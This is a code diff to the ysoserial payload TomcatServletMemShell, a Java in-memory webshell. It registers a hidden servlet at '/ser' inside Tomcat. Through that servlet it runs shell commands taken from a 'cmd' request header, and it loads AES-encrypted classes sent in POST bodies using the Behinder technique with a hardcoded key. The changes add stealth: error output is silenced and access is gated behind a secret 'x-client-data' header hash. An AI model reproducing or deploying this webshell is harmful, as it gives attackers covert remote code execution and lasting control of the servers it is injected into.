@@ -1,4 +1,4 @@
-package ysoserial.payloads.shells;
+package ysoserial.payloads.templates;
 
 import com.sun.jmx.mbeanserver.NamedObject;
 import com.sun.jmx.mbeanserver.Repository;
@@ -33,7 +33,7 @@ public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
 
     static {
         try {
-            String servletName = "MyServletVersion" + System.currentTimeMillis();
+            String servletName = "MyServletVersion" + System.nanoTime();
             String urlPattern = "/ser";
 
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
@@ -66,15 +66,13 @@ public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
                         wrapper.setServlet(servlet);
                         ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                         registration.addMapping(urlPattern);
-                        // todo delete
-                        // System.out.println("[+] Add Dynamic Servlet");
                     }
                 } catch (Exception e) {
-                    e.printStackTrace();
+                    // e.printStackTrace();
                 }
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            // e.printStackTrace();
         }
     }
 
@@ -111,32 +109,34 @@ public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
             pageContext.put("request", request);
             pageContext.put("response", response);
             pageContext.put("session", session);
-
-            if (request.getMethod().equals("GET")) {
-                String cmd = request.getHeader("cmd");
-                if (cmd != null && !cmd.isEmpty()) {
-                    String[] cmds = null;
-                    if (File.separator.equals("/")) {
-                        cmds = new String[]{"/bin/sh", "-c", cmd};
-                    } else {
-                        cmds = new String[]{"cmd", "/c", cmd};
+            // b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572 sha256 Y4er
+            if (request.getHeader("x-client-data").equalsIgnoreCase("b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572")) {
+                if (request.getMethod().equals("GET")) {
+                    String cmd = request.getHeader("cmd");
+                    if (cmd != null && !cmd.isEmpty()) {
+                        String[] cmds = null;
+                        if (File.separator.equals("/")) {
+                            cmds = new String[]{"/bin/sh", "-c", cmd};
+                        } else {
+                            cmds = new String[]{"cmd", "/c", cmd};
+                        }
+                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
+                        response.getWriter().println(result);
                     }
-                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
-                    response.getWriter().println(result);
-                }
-            } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
-                if (request.getMethod().equals("POST")) {
-                    String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
-                    session.putValue("u", k);
-                    Cipher c = Cipher.getInstance("AES");
-                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+                } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
+                    if (request.getMethod().equals("POST")) {
+                        String k = "7ab2695c3c103c7c54130685ef2cc03a".substring(16); // Y4er
+                        session.putValue("u", k);
+                        Cipher c = Cipher.getInstance("AES");
+                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
 
-                    //revision BehinderFilter
-                    Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                    method.setAccessible(true);
-                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
-                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
-                    evilclass.newInstance().equals(pageContext);
+                        //revision BehinderFilter
+                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                        method.setAccessible(true);
+                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                        Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
+                        evilclass.newInstance().equals(pageContext);
+                    }
                 }
             }
         } catch (Exception e) {
